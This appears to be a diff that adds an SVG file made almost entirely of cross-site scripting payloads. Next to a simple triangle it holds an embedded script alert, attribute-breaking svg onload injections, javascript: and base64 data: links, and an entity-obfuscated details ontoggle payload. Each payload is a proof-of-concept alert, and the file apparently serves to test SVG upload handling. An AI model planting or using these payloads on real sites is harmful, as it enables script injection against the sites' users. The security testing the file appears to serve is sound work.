@@ -1,0 +1,21 @@
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">
+alert("XSS by OS");
+</script>
+'"><Svg%20onload=1337-alert?.(document.domain)>
+
+'"><svg onload=confirm("OS_78")///
+
+javascript:alert(1)
+
+<a href="javascript:alert( 'OS_78')">show</a>
+
+<a href="data:text/html;base64,PHNjcm1wdD5hbGVydCgxKTwvc2NyaXBOPg==">show</a>
+
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin)>
+
+confirm?.(1)
+
+<svg onload="alert(1)" <="" svg="”
+</svg>
